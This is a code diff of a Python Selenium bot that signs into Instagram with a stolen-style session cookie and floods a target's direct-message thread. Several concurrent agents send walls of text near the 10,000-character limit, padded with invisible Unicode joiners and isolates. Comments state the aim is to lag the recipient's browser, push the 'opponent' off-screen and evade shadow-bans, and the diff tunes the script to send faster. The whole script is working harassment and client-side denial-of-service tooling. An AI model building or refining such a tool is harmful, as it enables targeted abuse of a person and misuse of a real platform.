@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (VISIBLE-LOCK V35)
-# 📅 STATUS: SERVER-BYPASS | 4-AGENT TOTAL | AWS-CPU-TARGET
+# 🚀 PROJECT: PRAVEER.OWNS (STICKY-VISIBLE V36)
+# 📅 STATUS: DOM-DOMINATION | 4-AGENT TOTAL | AWS-CPU-LOCK
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -13,30 +13,30 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.2, 0.5)    # ✅ Slower burst prevents the "Invisible" Shadow-Ban
-REST_AFTER_STRIKES = 100   
-REST_DURATION = 5          
+BURST_SPEED = (0.1, 0.4)    # 🔥 Fast but avoids server shadow-ban
+REST_AFTER_STRIKES = 150   
+REST_DURATION = 4          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_visible_lock_payload():
-    """Generates a visible branded payload with hidden layout-lag code."""
+def get_sticky_payload():
+    """Generates a high-authority visible payload that saturates the DOM tree."""
     u_id = random.randint(1000, 9999)
-    # \u2060 = Word Joiner (Invisible but forces layout math)
-    # \u200B = Zero Width Space (Invisible but forces wrap checks)
-    glue, brk = "\u2060", "\u200B"
+    # \u2060 = Word Joiner | \u2068 = First Strong Isolate
+    glue, iso, pop = "\u2060", "\u2068", "\u2069"
     
-    # 👑 THE BRANDING (This is what will be visible)
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NODE:{u_id}]"
+    # 👑 BRANDING SATURATION
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [LOCK_ID:{u_id}]"
     
     body = []
-    # 350 lines of invisible math
-    for i in range(350):
-        # We sandwich the visible name between thousands of invisible joiners
-        # The server sees 'PRAVEER PAPA', but the browser sees a 10,000px wide line.
-        line = f"PRAVEER PAPA {i} ON TOP 🌙{glue*20}{brk*10}"
+    # 390 lines to hit the 10,000 character limit
+    # This creates a 'Wall of Text' that physically scrolls the opponent off-screen
+    for i in range(390):
+        # We wrap the visible name in invisible isolates to prevent 'Skip Rendering'
+        # The Moon emoji triggers the fallback-font scan on the AWS machine
+        line = f"{iso}PRAVEER PAPA ON TOP 🌙 {i}{pop}{glue*15}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -50,7 +50,6 @@ def get_driver(agent_id):
         chrome_options.add_argument("--disable-gpu")
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
-        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
         chrome_options.add_argument(f"user-agent={ua}")
         
         driver = webdriver.Chrome(options=chrome_options)
@@ -64,28 +63,28 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(15) 
+            time.sleep(12) 
             
             while True:
-                payload = get_visible_lock_payload()
+                payload = get_sticky_payload()
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
+                    # Direct JS injection ensures your bot doesn't lag itself out
                     driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, payload)
-                    time.sleep(0.5) # ✅ Small delay to ensure server registration
                     box.send_keys(Keys.ENTER)
                     
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Visible Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Sticky Strike ({GLOBAL_SENT})")
                 except:
-                    break 
+                    break # Restart browser if DOM reloads
 
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(5)
+            time.sleep(3)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
